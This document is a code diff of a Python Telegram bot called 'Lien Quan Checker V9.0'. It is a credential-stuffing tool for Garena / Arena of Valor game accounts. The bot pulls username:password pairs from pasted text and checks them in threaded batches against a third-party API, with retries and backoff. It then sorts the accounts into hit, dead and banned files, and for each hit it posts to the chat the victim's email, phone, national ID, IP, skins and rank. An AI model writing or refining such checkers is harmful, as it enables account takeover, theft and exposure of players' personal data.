+        ms = re.findall(pc, content) or re.findall(pp, content)
+        for u, p in ms:
+            if is_time_value(u) or is_time_value(p):
+                continue
+            if is_valid_account(u, p):
+                k = f"{u}:{p}"
+                if k not in seen:
+                    seen.add(k)
+                    accounts.append((u, p))
+                    st["valid"] += 1
+                else:
+                    st["duplicate"] += 1
+            else:
+                st["invalid"] += 1
+    return accounts, st
+
 
 def save_loc_file(accounts):
     with file_lock:
         with open(OUTPUT_LOC, 'w', encoding='utf-8') as f:
-            for user, pwd in accounts:
-                f.write(f"{user}:{pwd}\n")
+            for u, p in accounts:
+                f.write(f"{u}:{p}\n")
 
-def format_value(value):
-    if isinstance(value, bool):
-        return "YES" if value else "NO"
-    elif isinstance(value, str) and value.lower() in ["true", "false"]:
-        return "YES" if value.lower() == "true" else "NO"
-    return value
 
-# ========== CHECK API VERSION 2.1 - FIXED ==========
-def check_account_api(username, password, service, use_delay=True):
+# ========== API ==========
+def check_account_api(username, password, service, use_delay=True, max_retry=None):
     if use_delay:
         rate_limit(DEFAULT_DELAY)
-    
-    cache_key = f"{username}:{password}:{service}"
-    with cache_lock:
-        if cache_key in cache_results:
-            return cache_results[cache_key]
-    
-    service_info = SERVICE_ROUTES.get(service, {})
-    route = service_info.get("route", "/api/lienquan")
-    param_names = service_info.get("params", ["tk", "mk"])
-    extra_params = service_info.get("extra_params", {})
-    
-    # API VERSION 2.1 - purchase.nhatminh301.com
-    url = f"{API_BASE}{route}"
-    
-    params = {
-        "username": API_USERNAME,
-        "password": API_PASSWORD
-    }
-    
-    if len(param_names) >= 2:
-        params[param_names[0]] = username
-        params[param_names[1]] = password
-    else:
-        params["tk"] = username
-        params["mk"] = password
-    
-    # Thêm extra params nếu có
-    for key, value in extra_params.items():
-        if value:
-            params[key] = value
-    
+
+    ck = f"{username}:{password}:{service}"
+    cached = api_cache.get(ck)
+    if cached is not None:
+        with stats_lock:
+            stats["cache_hits"] = stats.get("cache_hits", 0) + 1
+        return cached
+
+    si = SERVICE_ROUTES.get(service, {})
+    url = f"{API_BASE}{si.get('route', '/api/lienquan')}"
+    pn = si.get("params", ["tk", "mk"])
+    ep = si.get("extra_params", {})
+
+    params = {"username": API_USERNAME, "password": API_PASSWORD}
+    if len(pn) >= 2:
+        params[pn[0]] = username
+        params[pn[1]] = password
+    for k, v in ep.items():
+        if v:
+            params[k] = v
+
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Accept": "application/json",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "vi-VN,vi;q=0.9,en;q=0.8",
         "Content-Type": "application/json",
-        "Connection": "keep-alive"
+        "Connection": "keep-alive",
+        "Cache-Control": "no-cache"
     }
-    
-    for attempt in range(DEFAULT_RETRIES):
+
+    retries = max_retry if max_retry is not None else DEFAULT_RETRIES
+
+    for attempt in range(retries):
         try:
-            resp = requests.get(url, params=params, headers=headers, timeout=DEFAULT_TIMEOUT)
-            
-            if resp.status_code == 200:
-                try:
-                    result_data = resp.json()
-                    
-                    if isinstance(result_data, dict):
-                        for key, value in result_data.items():
-                            if isinstance(value, str):
-                                result_data[key] = fix_encoding(value)
-                            elif isinstance(value, list):
-                                result_data[key] = [fix_encoding(item) if isinstance(item, str) else item for item in value]
-                            elif isinstance(value, dict):
-                                for sub_key, sub_value in value.items():
-                                    if isinstance(sub_value, str):
-                                        value[sub_key] = fix_encoding(sub_value)
-                    
-                    if isinstance(result_data, dict):
-                        is_hit = False
-                        
-                        status_val = result_data.get("status")
-                        if status_val is not None:
-                            if status_val in [True, "true", 1, "1", "True", "TRUE", "success", "Success", "SUCCESS", "HIT", "hit"]:
-                                is_hit = True
-                            elif status_val in [False, "false", 0, "0", "False", "FALSE", "fail", "Fail", "FAIL", "dead", "Dead", "DEAD"]:
-                                is_hit = False
-                        
-                        success_val = result_data.get("success")
-                        if not is_hit and success_val is not None:
-                            if success_val in [True, "true", 1, "1", "True", "TRUE"]:
-                                is_hit = True
-                            elif success_val in [False, "false", 0, "0", "False", "FALSE"]:
-                                is_hit = False
-                        
-                        result_val = result_data.get("result")
-                        if result_val is not None:
-                            result_str = str(result_val).lower()
-                            if result_str in ["hit", "true", "success", "valid", "1", "live", "ok"]:
-                                is_hit = True
-                            elif result_str in ["dead", "false", "fail", "invalid", "0", "die", "error"]:
-                                is_hit = False
-                        
-                        message_val = result_data.get("message", "")
-                        if message_val:
-                            msg_lower = str(message_val).lower()
-                            if any(word in msg_lower for word in ["thanh cong", "thanh cong", "success", "valid", "hit", "dung", "live", "ok"]):
-                                is_hit = True
-                            elif any(word in msg_lower for word in ["that bai", "that bai", "fail", "invalid", "dead", "sai", "khong dung", "die", "error"]):
-                                is_hit = False
-                        
-                        data_val = result_data.get("data")
-                        if data_val is not None:
-                            if isinstance(data_val, (dict, list, str)) and data_val:
-                                is_hit = True
-                        
-                        info_fields = ["uid", "id", "name", "nickname", "account", "info", "user", "player", "level", "rank", "email", "phone", "sdt"]
-                        for field in info_fields:
-                            if field in result_data and result_data[field] is not None and result_data[field] != "":
-                                is_hit = True
-                                break
-                        
-                        result_data["result"] = "hit" if is_hit else "dead"
-                        
-                        with cache_lock:
-                            cache_results[cache_key] = result_data
-                        return result_data
-                    else:
-                        result = {"result": "unknown"}
-                        with cache_lock:
-                            cache_results[cache_key] = result
-                        return result
-                        
-                except json.JSONDecodeError:
-                    text_lower = resp.text.lower()
-                    if any(word in text_lower for word in ["success", "ok", "true", "hit", "valid", "live"]):
-                        result = {"result": "hit"}
-                    elif any(word in text_lower for word in ["fail", "false", "dead", "invalid", "error", "die"]):
-                        result = {"result": "dead"}
-                    else:
-                        result = {"result": "unknown"}
-                    
-                    with cache_lock:
-                        cache_results[cache_key] = result
-                    return result
-                    
-            elif resp.status_code == 429:
-                retry_after = resp.headers.get("Retry-After", "5")
-                try:
-                    wait_time = int(retry_after)
-                except:
-                    wait_time = 5 * (attempt + 1)
-                time.sleep(wait_time)
-                continue
-            elif resp.status_code == 401:
-                result = {"result": "error", "_error": "Invalid API credentials"}
-                with cache_lock:
-                    cache_results[cache_key] = result
+            r = requests.get(url, params=params, headers=headers,
+                             timeout=DEFAULT_TIMEOUT)
+            if r.status_code == 200:
+                result = parse_api_response(r)
+                api_cache.set(ck, result)
                 return result
-            elif resp.status_code == 403:
-                result = {"result": "error", "_error": "Forbidden access"}
-                with cache_lock:
-                    cache_results[cache_key] = result
-                return result
-            else:
-                time.sleep(2)
+            if r.status_code in RETRY_STATUS:
+                with stats_lock:
+                    stats["retries"] = stats.get("retries", 0) + 1
+                w = min(BACKOFF_BASE ** attempt, BACKOFF_MAX)
+                if r.status_code == 429:
+                    try:
+                        w = max(w, int(r.headers.get("Retry-After", w)))
+                    except:
+                        pass
+                time.sleep(w)
                 continue
-                
-        except requests.exceptions.Timeout:
-            if attempt < DEFAULT_RETRIES - 1:
-                time.sleep(3)
-                continue
-        except requests.exceptions.ConnectionError:
-            if attempt < DEFAULT_RETRIES - 1:
-                time.sleep(5)
+            if r.status_code in (401, 403):
+                rs = {"result": "error", "_error": f"HTTP {r.status_code}"}
+                api_cache.set(ck, rs)
+                return rs
+            time.sleep(BACKOFF_BASE ** attempt)
+            continue
+        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+            with stats_lock:
+                stats["retries"] = stats.get("retries", 0) + 1
+            if attempt < retries - 1:
+                time.sleep(min(BACKOFF_BASE ** attempt, BACKOFF_MAX))
                 continue
         except Exception:
-            if attempt < DEFAULT_RETRIES - 1:
-                time.sleep(3)
+            if attempt < retries - 1:
+                time.sleep(2)
                 continue
-    
-    result = {"result": "error", "_error": "All retries failed"}
-    with cache_lock:
-        cache_results[cache_key] = result
-    return result
 
-def format_hit_info(username, password, service, result_data):
-    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
-    icon = SERVICE_ROUTES.get(service, {}).get("icon", "✅")
-    
-    line = "━━━━━━━━━━━━━━━━━━━━━━"
-    
-    msg = f"{line}\n{icon} <b>HIT - {service_desc}</b>\n{line}\n"
-    msg += f"🔑 <b>Account:</b> <code>{username}:{password}</code>\n"
-    
-    if isinstance(result_data, dict):
-        field_map = {
-            "uid": ("👤 UID", "uid"),
-            "name": ("👤 Name", "name"),
-            "nickname": ("👤 Nickname", "nickname"),
-            "region": ("🌐 Region", "region"),
-            "shells": ("💰 Shells", "shells"),
-            "so": ("💲 So", "so"),
-            "nap_so": ("💰 Nap so", "nap_so"),
-            "email_verified": ("📩 EMAIL", "email_verified"),
-            "email": ("📩 EMAIL", "email"),
-            "mobile_bound": ("📱 SDT", "mobile_bound"),
-            "phone": ("📱 SDT", "phone"),
-            "sdt": ("📱 SDT", "sdt"),
-            "fb": ("🔗 FB", "fb"),
-            "fb_linked": ("🔗 FB", "fb_linked"),
-            "password_set": ("🛡 PASS", "password_set"),
-            "account_secured": ("🛡 Account Secured", "account_secured"),
-            "banned": ("🚫 BAND", "banned"),
-            "ban": ("🚫 BAND", "ban"),
-            "aov_banned": ("🚫 BAND", "aov_banned"),
-            "ban_until": ("🚫 BAND Den", "ban_until"),
-            "ban_expires": ("🚫 BAND Den", "ban_expires"),
-            "last_login": ("⏰ Login cuoi", "last_login"),
-            "garena_created": ("📅 Tao GR", "garena_created"),
-            "created_at": ("📅 Tao GR", "created_at"),
-            "server": ("🖥 Server", "server"),
-            "aov_name": ("🔥 NAME", "aov_name"),
-            "aov_rank": ("👑 RANK", "aov_rank"),
-            "aov_level": ("✨ LEVEL", "aov_level"),
-            "aov_total_skins": ("💎 SKIN", "aov_total_skins"),
-            "aov_total_champs": ("💪 HERO", "aov_total_champs"),
-            "aov_total_heroes": ("💪 HERO", "aov_total_heroes"),
-            "aov_total_relationships": ("⚡️ QH", "aov_total_relationships"),
-            "aov_ss": ("✨ SS", "aov_ss"),
-            "aov_sss": ("🔥 SSS", "aov_sss"),
-            "aov_anime": ("🔥 Anime", "aov_anime"),
-            "aov_ss_list": ("✨ SS List", "aov_ss_list"),
-            "aov_sss_list": ("🔥 SSS List", "aov_sss_list"),
-            "aov_anime_list": ("🔥 Anime List", "aov_anime_list"),
-            "aov_other": ("🎲 Other", "aov_other"),
-            "aov_other_list": ("🎲 Other List", "aov_other_list"),
-            "cccd": ("📄 CCCD", "cccd"),
-            "authen": ("🛡 Authen", "authen"),
-            "tinh_trang": ("📋 Tinh Trang", "tinh_trang"),
-            "status_account": ("📋 Tinh Trang", "status_account"),
-            "fc_name": ("🔥 FC Name", "fc_name"),
-            "fc_uid": ("🆔 FC UID", "fc_uid"),
-            "fc_ovr": ("📊 OVR", "fc_ovr"),
-            "fc_level": ("✨ FC Level", "fc_level"),
-            "fc_rank": ("👑 FC Rank", "fc_rank"),
-            "last_session_ip": ("🌐 IP", "last_session_ip"),
-            "last_session_country": ("🌍 Country", "last_session_country"),
-            "ngay_tao_tk": ("📅 Ngay tao TK", "ngay_tao_tk"),
-            "ban_reason": ("🚫 Ly do Band", "ban_reason")
-        }
-        
-        info_lines = []
-        
-        for key, (label, field) in field_map.items():
-            if field in result_data and result_data[field] is not None and result_data[field] != "" and result_data[field] != "N/A":
-                value = result_data[field]
-                
-                if isinstance(value, (int, float)) and value == 0:
-                    continue
-                if isinstance(value, str) and value in ["0", "00", "000"]:
-                    continue
-                
-                if isinstance(value, str):
-                    value = fix_encoding(value)
-                
-                if field in ["email_verified", "mobile_bound", "fb_linked", "password_set", "account_secured"]:
-                    value = format_value(value)
-                
-                if field == "aov_banned":
-                    if isinstance(value, str) and value.upper() == "NO":
-                        value = "NO"
-                    elif isinstance(value, bool):
-                        value = "YES" if value else "NO"
-                
-                if isinstance(value, list):
-                    if value:
-                        value = "[" + ", ".join([fix_encoding(str(item)) for item in value]) + "]"
-                    else:
-                        continue
-                
-                if isinstance(value, tuple):
-                    if value:
-                        value = "[" + ", ".join([fix_encoding(str(item)) for item in value]) + "]"
-                    else:
-                        continue
-                
-                if field in ["banned", "ban", "aov_banned"]:
-                    if isinstance(value, str) and value.upper() == "NO":
-                        value = "NO"
-                    elif isinstance(value, bool):
-                        value = "YES" if value else "NO"
-                    elif isinstance(value, str) and value.upper() == "YES":
-                        value = "YES"
-                
-                if field in ["ban_until", "ban_expires"]:
-                    if isinstance(value, str):
-                        value = fix_encoding(value)
-                        value = f"[{value}]"
-                
-                info_lines.append(f"{label}: {value}")
-        
-        skip_fields = set(field_map.keys())
-        skip_fields.update(["result", "_is_hit", "_raw_response", "_error", "status", "success", "tk", "mk", "data", "message", "username"])
-        
-        for key, value in result_data.items():
-            if key not in skip_fields and value is not None and value != "" and value != {} and value != []:
-                if isinstance(value, (int, float)) and value == 0:
-                    continue
-                if isinstance(value, str) and value in ["0", "00", "000"]:
-                    continue
-                
-                if isinstance(value, (str, int, float)):
-                    label = key.replace("_", " ").title()
-                    value = format_value(value)
-                    if isinstance(value, str):
-                        value = fix_encoding(value)
-                    info_lines.append(f"▫️ {label}: {value}")
-                elif isinstance(value, list) and value:
-                    label = key.replace("_", " ").title()
-                    list_value = "[" + ", ".join([fix_encoding(str(item)) for item in value]) + "]"
-                    info_lines.append(f"▫️ {label}: {list_value}")
-                elif isinstance(value, dict):
-                    for sub_key, sub_value in value.items():
-                        if sub_value is not None and sub_value != "" and sub_value != {} and sub_value != []:
-                            if isinstance(sub_value, (str, int, float)):
-                                if isinstance(sub_value, (int, float)) and sub_value == 0:
-                                    continue
-                                sub_label = sub_key.replace("_", " ").title()
-                                sub_value = format_value(sub_value)
-                                if isinstance(sub_value, str):
-                                    sub_value = fix_encoding(sub_value)
-                                info_lines.append(f"▫️ {sub_label}: {sub_value}")
-        
-        if info_lines:
-            msg += "\n".join(info_lines)
-            msg += f"\n{line}"
-    
-    return msg
+    rs = {"result": "error", "_error": "All retries failed"}
+    api_cache.set(ck, rs)
+    return rs
 
+
+def parse_api_response(r):
+    try:
+        rd = r.json()
+        if isinstance(rd, dict):
+            for k, v in list(rd.items()):
+                if isinstance(v, str):
+                    rd[k] = fix_encoding(v)
+                elif isinstance(v, list):
+                    rd[k] = [fix_encoding(i) if isinstance(i, str) else i for i in v]
+                elif isinstance(v, dict):
+                    for sk, sv in list(v.items()):
+                        if isinstance(sv, str):
+                            v[sk] = fix_encoding(sv)
+
+            hit = False
+            sv = rd.get("status")
+            if sv is not None:
+                if sv in [True, "true", 1, "1", "True", "TRUE",
+                          "success", "Success", "SUCCESS", "HIT", "hit"]:
+                    hit = True
+                elif sv in [False, "false", 0, "0", "False", "FALSE",
+                            "fail", "Fail", "FAIL", "dead", "Dead", "DEAD"]:
+                    hit = False
+            su = rd.get("success")
+            if not hit and su is not None:
+                if su in [True, "true", 1, "1", "True", "TRUE"]:
+                    hit = True
+            rv = rd.get("result")
+            if rv is not None:
+                rs = str(rv).lower()
+                if rs in ["hit", "true", "success", "valid", "1", "live", "ok"]:
+                    hit = True
+                elif rs in ["dead", "false", "fail", "invalid", "0", "die", "error"]:
+                    hit = False
+            mv = rd.get("message", "")
+            if mv:
+                ml = str(mv).lower()
+                if any(w in ml for w in ["thanh cong", "success", "valid",
+                                          "hit", "dung", "live", "ok"]):
+                    hit = True
+                elif any(w in ml for w in ["that bai", "fail", "invalid",
+                                            "dead", "sai", "khong dung",
+                                            "die", "error"]):
+                    hit = False
+            dv = rd.get("data")
+            if dv is not None and isinstance(dv, (dict, list, str)) and dv:
+                hit = True
+            for f in ["uid", "id", "name", "nickname", "account", "info",
+                      "user", "player", "level", "rank", "email", "phone",
+                      "sdt", "aov_name", "shells"]:
+                if f in rd and rd[f] not in [None, "", 0, "0"]:
+                    hit = True
+                    break
+            rd["result"] = "hit" if hit else "dead"
+            return rd
+        return {"result": "unknown"}
+    except json.JSONDecodeError:
+        tl = r.text.lower()
+        if any(w in tl for w in ["success", "ok", "true", "hit", "valid", "live"]):
+            return {"result": "hit"}
+        if any(w in tl for w in ["fail", "false", "dead", "invalid", "error", "die"]):
+            return {"result": "dead"}
+        return {"result": "unknown"}
+    except Exception:
+        return {"result": "error", "_error": "parse failed"}
+
+
+# ========== CHECK ==========
 def check_single(chat_id, username, password, service="lienquan"):
-    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
-    safe_send_message(chat_id, f"🔍 Dang check <code>{username}:{password}</code> voi {service_desc}...")
-    
-    result = check_account_api(username, password, service, use_delay=False)
-    result_type = result.get("result", "unknown")
-    
-    if result_type == "hit":
-        hit_msg = format_hit_info(username, password, service, result)
-        safe_send_message(chat_id, hit_msg)
-    elif result_type == "dead":
-        safe_send_message(chat_id, f"❌ DEAD - {service_desc}\n🔑 {username}:{password}")
+    safe_send_message(chat_id,
+                      f"🔍 Dang check <code>{username}:{password}</code>...")
+    r = check_account_api(username, password, service, use_delay=False)
+    rt = r.get("result", "unknown")
+    if rt == "hit":
+        is_b, reason = is_account_banned(r)
+        if is_b:
+            save_to_file(BANNED_OUTPUT_FILE, username, password,
+                         f"{service}|{reason}")
+            safe_send_message(chat_id, "🚫 ACC BI BAN - DA LOAI BO")
+            safe_send_message(chat_id, format_hit_info(username, password, service, r))
+        else:
+            save_to_file(CLEAN_OUTPUT_FILE, username, password)
+            safe_send_message(chat_id, format_hit_info(username, password, service, r))
+    elif rt == "dead":
+        save_to_file(DEAD_OUTPUT_FILE, username, password)
+        safe_send_message(chat_id,
+                          f"❌ DEAD\n🔑 <code>{username}:{password}</code>")
     else:
-        safe_send_message(chat_id, f"⚠️ ERROR - {service_desc}\n🔑 {username}:{password}")
+        save_to_file(ERROR_OUTPUT_FILE, username, password)
+        safe_send_message(chat_id,
+                          f"⚠️ ERROR\n🔑 <code>{username}:{password}</code>")
 
-def check_batch(chat_id, accounts, service):
+
+def check_batch(chat_id, accounts, service="lienquan"):
     global checking, stats
-    
+
     if checking:
         safe_send_message(chat_id, "⚠️ Dang check roi!")
         return
-    
+
     checking = True
     stop_event.clear()
-    
+    api_cache.clear()
+    clear_output_files()
+
     total = len(accounts)
-    stats = {
-        "total": total,
-        "checked": 0,
-        "hits": 0,
-        "dead": 0,
-        "errors": 0,
-        "unknown": 0,
-        "start_time": time.time()
-    }
-    
-    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
+    stats = {"total": total, "checked": 0, "hits": 0, "dead": 0,
+             "errors": 0, "banned": 0, "clean": 0,
+             "retries": 0, "cache_hits": 0, "removed": 0,
+             "start_time": time.time()}
+
     icon = SERVICE_ROUTES.get(service, {}).get("icon", "🔍")
-    
+
     safe_send_message(chat_id, f"""
-{icon} <b>BAT DAU CHECK - API V2.1</b>
+{icon} <b>CHECK LIEN QUAN V9.0</b>
 📊 Tong: <code>{total}</code> accounts
-🎯 Service: <b>{service_desc}</b>
 ⚡ Threads: <code>{CHECKMULTI_THREADS}</code>
 ⏱ Delay: <code>{CHECKMULTI_DELAY}s</code>
-📦 Batch: <code>{CHECKMULTI_BATCH_SIZE} acc/batch</code>
+📦 Batch: <code>{CHECKMULTI_BATCH_SIZE}</code>
+🔁 Retry: <code>{DEFAULT_RETRIES}</code>
+🧹 <b>AUTO LOAI BO ACC BAN</b>
 """)
-    
-    batches = []
-    for i in range(0, total, CHECKMULTI_BATCH_SIZE):
-        batch = accounts[i:i + CHECKMULTI_BATCH_SIZE]
-        batches.append(batch)
-    
-    total_batches = len(batches)
-    batch_num = 0
-    
-    def process_single(user, pwd):
+
+    batches = [accounts[i:i + CHECKMULTI_BATCH_SIZE]
+               for i in range(0, total, CHECKMULTI_BATCH_SIZE)]
+
+    def process_one(user, pwd):
         if stop_event.is_set():
             return
-        
+
         rate_limit(CHECKMULTI_DELAY)
-        
-        result = check_account_api(user, pwd, service, use_delay=False)
-        result_type = result.get("result", "unknown")
-        
+
+        r = check_account_api(user, pwd, service, use_delay=False,
+                              max_retry=CHECKMULTI_MAX_RETRY)
+        rt = r.get("result", "unknown")
+
+        is_b = False
         with stats_lock:
             stats["checked"] += 1
-            
-            if result_type == "hit":
+
+            if rt == "hit":
                 stats["hits"] += 1
-                try:
-                    hit_msg = format_hit_info(user, pwd, service, result)
-                    safe_send_message(chat_id, hit_msg)
-                except:
-                    pass
-            elif result_type == "dead":
+                is_b, reason = is_account_banned(r)
+                if is_b:
+                    stats["banned"] += 1
+                    stats["removed"] += 1
+                    save_to_file(BANNED_OUTPUT_FILE, user, pwd,
+                                 f"{service}|{reason}")
+                else:
+                    stats["clean"] += 1
+                    save_to_file(CLEAN_OUTPUT_FILE, user, pwd)
+                save_to_file(HIT_OUTPUT_FILE, user, pwd, service)
+            elif rt == "dead":
                 stats["dead"] += 1
+                save_to_file(DEAD_OUTPUT_FILE, user, pwd)
             else:
                 stats["errors"] += 1
-    
-    for batch in batches:
+                save_to_file(ERROR_OUTPUT_FILE, user, pwd)
+
+        if rt == "hit":
+            try:
+                if is_b:
+                    safe_send_message(chat_id, "🚫 <b>ACC BI BAN - DA LOAI BO</b>")
+                safe_send_message(chat_id, format_hit_info(user, pwd, service, r))
+            except:
+                pass
+
+    for bn, batch in enumerate(batches, 1):
         if stop_event.is_set():
             break
-        
-        batch_num += 1
-        
-        safe_send_message(chat_id, f"""
-📦 <b>BATCH {batch_num}/{total_batches}</b>
-🔍 Dang check {len(batch)} accounts...
-""")
-        
-        with ThreadPoolExecutor(max_workers=CHECKMULTI_THREADS) as executor:
-            futures = {executor.submit(process_single, user, pwd): (user, pwd) 
-                       for user, pwd in batch}
-            
-            for future in as_completed(futures):
+
+        with ThreadPoolExecutor(max_workers=CHECKMULTI_THREADS) as ex:
+            futs = [ex.submit(process_one, u, p) for u, p in batch]
+            for f in as_completed(futs):
                 if stop_event.is_set():
-                    executor.shutdown(wait=False)
+                    ex.shutdown(wait=False)
                     break
-        
+
         elapsed = time.time() - stats["start_time"]
-        speed = stats["checked"] / elapsed if elapsed > 0 else 0
-        percent = (stats["checked"] / total) * 100
-        
+        spd = stats["checked"] / elapsed if elapsed > 0 else 0
+        pct = (stats["checked"] / total) * 100
+        eta = (total - stats["checked"]) / spd if spd > 0 else 0
+        eta_str = time.strftime("%M:%S", time.gmtime(eta)) if eta < 3600 else ">1h"
+
         safe_send_message(chat_id, f"""
-📊 <b>TIEN DO - {stats['checked']}/{total}</b> ({percent:.1f}%)
+📦 <b>BATCH {bn}/{len(batches)}</b> - {pct:.1f}%
 ✅ Hits: <code>{stats['hits']}</code>
+🟢 Clean: <code>{stats['clean']}</code>
+🚫 Banned: <code>{stats['banned']}</code>
 ❌ Dead: <code>{stats['dead']}</code>
 ⚠️ Errors: <code>{stats['errors']}</code>
-⚡ Speed: <code>{speed:.1f}</code> acc/s
+⚡ <code>{spd:.1f}</code> acc/s | ⏱ ETA <code>{eta_str}</code>
 """)
-        
-        if batch_num < total_batches:
+
+        if bn < len(batches):
             time.sleep(CHECKMULTI_BATCH_DELAY)
-    
+
     checking = False
     elapsed = time.time() - stats["start_time"]
-    
+    spd = stats["checked"] / elapsed if elapsed > 0 else 0
+
     safe_send_message(chat_id, f"""
 ✅ <b>CHECK HOAN TAT!</b>
+━━━━━━━━━━━━━━━━━━━━
 📊 Tong: <code>{stats['total']}</code>
 🎯 HIT: <code>{stats['hits']}</code>
+🟢 Clean: <code>{stats['clean']}</code>
+🚫 Banned: <code>{stats['banned']}</code>
+🧹 Da loai bo: <code>{stats['removed']}</code>
 ❌ DEAD: <code>{stats['dead']}</code>
 ⚠️ ERROR: <code>{stats['errors']}</code>
-⏱ Thoi gian: <code>{elapsed:.1f}s</code>
+🔁 Retries: <code>{stats['retries']}</code>
+💾 Cache: <code>{stats['cache_hits']}</code>
+⏱ Time: <code>{elapsed:.1f}s</code>
+⚡ Speed: <code>{spd:.1f}</code> acc/s
+━━━━━━━━━━━━━━━━━━━━
+📁 <code>{CLEAN_OUTPUT_FILE}</code>
+📁 <code>{BANNED_OUTPUT_FILE}</code>
 """)
 
-def check_all_services(chat_id, accounts):
-    global checking
-    
-    if checking:
-        safe_send_message(chat_id, "⚠️ Dang check roi!")
+
+# ========== COMMANDS ==========
+@bot.message_handler(commands=['start'])
+def cmd_start(message):
+    if not check_membership(message):
         return
-    
+    safe_send_message(message.chat.id, f"""
+🎮 <b>LIEN QUAN CHECKER V9.0</b>
+👤 Admin: @{ADMIN_USERNAME}
+
+🧹 <b>TỰ ĐỘNG LOẠI BỎ ACC BAN</b>
+
+📌 <b>LENH:</b>
+/check user:pass - Check 1 acc
+/checkmulti u1:p1,u2:p2 - Check nhieu
+/checkall - Check tat ca
+/bannedstats - Thong ke
+/clearbanned - Xoa file (admin)
+/stop - Dung check
+""")
+
+
+@bot.message_handler(commands=['check'])
+def cmd_check(message):
+    if not check_membership(message):
+        return
+    parts = message.text.split()
+    if len(parts) < 2:
+        safe_send_message(message.chat.id, "❌ /check user:pass")
+        return
+    acc_input = parts[1].replace('|', ':')
+    accounts, _ = loc_tk_mk_only(acc_input)
     if not accounts:
-        safe_send_message(chat_id, "❌ Khong co accounts!")
+        safe_send_message(message.chat.id, "❌ Format sai!")
         return
-    
-    checking = True
-    stop_event.clear()
-    
-    total_accounts = len(accounts)
-    total_services = len(SERVICE_ROUTES)
-    
-    safe_send_message(chat_id, f"""
-⚡ <b>CHECK TAT CA SERVICE - API V2.1</b>
-📊 Accounts: <code>{total_accounts}</code>
-📋 Services: <code>{total_services}</code>
-""")
-    
-    stats_all = {
-        "total": total_accounts * total_services,
-        "checked": 0,
-        "hits": 0,
-        "dead": 0,
-        "errors": 0,
-        "start_time": time.time()
-    }
-    
-    def process_all(user, pwd, service):
-        if stop_event.is_set():
-            return
-        
-        rate_limit(DEFAULT_DELAY)
-        
-        result = check_account_api(user, pwd, service, use_delay=False)
-        result_type = result.get("result", "unknown")
-        
-        with stats_lock:
-            stats_all["checked"] += 1
-            if result_type == "hit":
-                stats_all["hits"] += 1
-                try:
-                    hit_msg = format_hit_info(user, pwd, service, result)
-                    safe_send_message(chat_id, hit_msg)
-                except:
-                    pass
-            elif result_type == "dead":
-                stats_all["dead"] += 1
-            else:
-                stats_all["errors"] += 1
-    
-    batches = []
-    for i in range(0, len(accounts), CHECKMULTI_BATCH_SIZE):
-        batch_accounts = accounts[i:i + CHECKMULTI_BATCH_SIZE]
-        batches.append(batch_accounts)
-    
-    batch_num = 0
-    total_batches = len(batches)
-    
-    for batch_accounts in batches:
-        if stop_event.is_set():
-            break
-        
-        batch_num += 1
-        
-        safe_send_message(chat_id, f"""
-📦 <b>BATCH {batch_num}/{total_batches}</b>
-🔍 Dang check {len(batch_accounts)} accounts x {total_services} services...
-""")
-        
-        all_tasks = [(user, pwd, service) for user, pwd in batch_accounts for service in SERVICE_ROUTES.keys()]
-        
-        with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
-            futures = {executor.submit(process_all, user, pwd, service): (user, pwd, service) 
-                       for user, pwd, service in all_tasks}
-            
-            for future in as_completed(futures):
-                if stop_event.is_set():
-                    executor.shutdown(wait=False)
-                    break
-        
-        elapsed = time.time() - stats_all["start_time"]
-        speed = stats_all["checked"] / elapsed if elapsed > 0 else 0
-        percent = (stats_all["checked"] / stats_all["total"]) * 100
-        
-        safe_send_message(chat_id, f"""
-📊 <b>TIEN DO - {stats_all['checked']}/{stats_all['total']}</b> ({percent:.1f}%)
-🎯 Hits: <code>{stats_all['hits']}</code>
-❌ Dead: <code>{stats_all['dead']}</code>
-⚡ Speed: <code>{speed:.1f}</code> acc/s
-""")
-        
-        if batch_num < total_batches:
-            time.sleep(CHECKMULTI_BATCH_DELAY)
-    
+    u, p = accounts[0]
+    threading.Thread(target=check_single,
+                     args=(message.chat.id, u, p, "lienquan")).start()
+
+
+@bot.message_handler(commands=['checkmulti'])
+def cmd_checkmulti(message):
+    if not check_membership(message):
+        return
+    text = message.text.strip()
+    if text.startswith('/checkmulti'):
+        text = text[len('/checkmulti'):].strip()
+    if not text:
+        safe_send_message(message.chat.id,
+                          "❌ /checkmulti user1:pass1\\nuser2:pass2")
+        return
+    acc_input = text.replace(',', '\n').replace('|', ':')
+    accounts, _ = loc_tk_mk_only(acc_input)
+    if not accounts:
+        safe_send_message(message.chat.id, "❌ Khong tim thay acc!")
+        return
+    safe_send_message(message.chat.id,
+                      f"📊 Check {len(accounts)} accounts (tu dong loai bo ban)...")
+    threading.Thread(target=check_batch,
+                     args=(message.chat.id, accounts, "lienquan")).start()
+
+
+@bot.message_handler(commands=['checkall'])
+def cmd_checkall(message):
+    if not check_membership(message):
+        return
+    cid = message.chat.id
+    if cid in pending_accounts and pending_accounts[cid]:
+        accs = pending_accounts[cid]
+        pending_accounts[cid] = []
+        threading.Thread(target=check_batch,
+                         args=(cid, accs, "lienquan")).start()
+    else:
+        safe_send_message(cid, "❌ Khong co acc nao dang cho!")
+
+
+@bot.message_handler(commands=['stop'])
+def cmd_stop(message):
+    if not check_membership(message):
+        return
+    stop_event.set()
+    global checking
     checking = False
-    elapsed = time.time() - stats_all["start_time"]
-    
-    safe_send_message(chat_id, f"""
-✅ CHECK ALL HOAN TAT!
-🎯 Hits: {stats_all['hits']}
-❌ Dead: {stats_all['dead']}
-⚠️ Errors: {stats_all['errors']}
-⏱ Time: {elapsed:.1f}s
-""")
+    safe_send_message(message.chat.id, "🛑 Da dung check!")
 
-# ========== LENH ==========
-@bot.message_handler(commands=['upaudio'])
-def cmd_upaudio(message):
-    if str(message.from_user.id) != ADMIN_CHAT_ID:
-        safe_send_message(message.chat.id, "❌ Ban khong co quyen!")
+
+@bot.message_handler(commands=['bannedstats'])
+def cmd_bannedstats(message):
+    if not check_membership(message):
         return
-    
-    safe_send_message(message.chat.id, """
-🎵 <b>UPLOAD AUDIO - ADMIN</b>
-Gui file .wav hoac .mp3 vao bot
+    counts = {}
